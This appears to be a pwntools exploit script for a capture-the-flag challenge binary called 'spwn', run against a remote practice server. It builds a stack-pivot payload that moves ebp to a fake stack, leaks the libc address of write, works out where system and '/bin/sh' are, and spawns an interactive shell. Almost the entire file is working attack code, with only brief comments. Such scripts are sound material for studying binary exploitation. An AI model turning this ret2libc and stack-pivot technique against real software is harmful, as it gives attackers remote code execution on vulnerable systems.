from pwn import *
from LibcSearcher import *
context.arch='i386'

# the second read limit the length of inputs to 0x20, 
# we can't make satck overflow by this,
# but we cuold control ebp to a fake satck to getshell by satck pivot

# p = process('./spwn')
p = remote('node3.buuoj.cn',29180)
elf = ELF('./spwn',checksec=False)

fake_stack = 0x0804A300
leave_ret = 0x08048408

p.recvuntil('What is your name?')
# payload = flat(['aaaa',elf.sym['puts'], elf.sym['main'], elf.got['read']])
payload = flat(['aaaa', elf.sym['write'], elf.sym['main'], 1, elf.got['write'], 4])
# leak the libc
p.send(payload)

p.recvuntil('What do you want to say?')
payload = 'A'*0x18 + p32(fake_stack) + p32(leave_ret)
# stack pivot
p.send(payload)


write_addr = u32(p.recv(4))
log.success('write_addr = %#x',write_addr)

libc = LibcSearcher('write',write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')
log.info('system_addr = %#x, binsh = %#x'%(system_addr,binsh))

p.recvuntil('What is your name?')
payload = flat(['aaaa', system_addr, elf.sym['main'], binsh])
p.send(payload)

p.recvuntil('What do you want to say?')
payload = 'A'*0x18 + p32(fake_stack) + p32(leave_ret)
p.send(payload)
sleep(1)
p.interactive()
